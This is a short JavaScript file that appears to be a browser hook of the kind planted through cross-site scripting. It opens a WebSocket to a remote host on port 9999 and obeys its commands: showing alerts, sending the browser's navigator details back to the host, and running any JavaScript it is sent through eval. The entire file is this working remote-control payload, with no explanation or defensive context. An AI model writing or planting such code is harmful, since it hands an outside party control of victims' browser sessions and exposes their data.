var ws = new WebSocket("ws://"+window.location.href.split('#')[1]+":9999");
ws.onmessage = function (event) {
  data=event.data;
  if(data.substr(0, 5)=="alert") {
     alert(data.substr(6, data.length));
     ws.send('rsp:Executed!')
  }
  if(data=="nav") {
    l=["appCodeName","appName","appVersion","language","platform","product","userAgent"]
    for(i=0;i<l.length;i++) {
      ws.send("rsp:"+l[i]+"="+navigator[l[i]]);
    }
  }
  if(data.substr(0, 2)=="js") {
     eval(data.substr(3, data.length));
     ws.send('rsp:Executed!')
  }
}
